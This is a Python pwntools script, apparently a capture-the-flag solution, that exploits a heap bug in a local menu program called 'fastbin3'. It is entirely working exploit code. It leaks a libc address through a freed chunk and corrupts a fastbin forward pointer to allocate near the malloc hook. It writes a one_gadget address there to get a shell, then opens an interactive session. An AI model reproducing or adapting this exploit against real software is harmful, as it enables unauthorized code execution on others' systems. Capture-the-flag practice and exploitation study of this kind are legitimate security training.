from pwn import *

p = process("./fastbin3")

def add(opt,cont,idx):
	print("lol")
	print(p.sendlineafter("Enter choice >> ",str(1)))
	print(p.sendlineafter("Enter index :", str(idx)))
	print(p.sendlineafter("Enter size:",str(opt)))
	p.sendline(str(cont))

def edit(idx,cont):
	print("lol")
	p.sendlineafter("Enter choice >> ",str(2))
	p.sendlineafter("Enter index :", str(idx))
	#p.sendlineafter("Enter size:",str(opt))
	p.sendline(cont)

def view(idx):
	print(p.sendlineafter("Enter choice >> ",str(3)))
	print(p.sendlineafter("Enter index :", str(idx)))
	print(p.recvuntil("Data: "))
	l=p.recvline()
	if(idx!=9):
		l = u64(l.strip()+'\x00'*2)
	#print(hex(u64(l.strip()+'\x00'*2)))
		return l

def fr33(idx):
	p.sendlineafter("Enter choice >> ",str(4))
	p.sendlineafter("Enter index :", str(idx))

def ex1t():
	p.sendlineafter("Enter choice >> ",str(5))

add(128,'a'*12,0)
add(128,'b'*12,1)
fr33(0)
for i in range(2,6):
	add(0,0,i)

leak = view(3)- 0x3c4b78
print(hex(leak))
system = leak + 0x45390
overw = leak+0x3c4af5-0x8
print(hex(overw))

add(0x60,'t'*10,6)
add(0x60,'s'*10,7)
fr33(7)
edit(6,'a'*0x60+p64(0x00)+p64(0x71)+p64(overw))
#gdb.attach(p,'pie breakpoint add')
add(0x60,'fake',8)
add(0x60,'a'*0x13+p64(leak+0xf1147),9)
add(0x60,'t'*10,5)
#add(0x20,'fake',1)
gdb.attach(p,'pie breakpoint view')
p.interactive()